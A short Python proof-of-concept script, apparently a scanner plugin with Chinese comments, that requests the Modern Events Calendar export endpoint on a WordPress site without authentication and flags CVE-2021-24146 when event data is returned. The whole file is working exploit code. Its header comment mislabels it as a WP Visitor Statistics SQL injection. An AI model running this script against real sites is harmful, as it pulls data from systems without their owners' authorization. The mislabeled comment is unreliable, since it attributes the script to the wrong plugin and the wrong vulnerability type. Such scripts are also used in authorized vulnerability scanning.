# coding: utf-8
import requests
import csv

#WordPress Plugin WP Visitor Statistics 4.7 - SQL Injection
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")

    header = {
        'User-Agent': user_agent
    }

    #漏洞位置
    exploit_url = url + '/wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=csv'

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.get(exploit_url, headers=header, proxies=proxies)
    else:
        response = requests.get(exploit_url, headers=header)

    decoded_content = response.content.decode('utf-8')
    cr = csv.reader(decoded_content.splitlines(), delimiter=',')
    my_list = list(cr)

    if response.status_code==200 and 'ID' in response.text and 'Event Cost' in response.text:
        return "WordPress Plugin Modern Events Calendar 5.16.2 - 事件导出    漏洞编号：CVE-2021-24146"


def run(url,logindict,user_agent,proxies):
    result = poc(url,logindict,user_agent,proxies)
    return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')

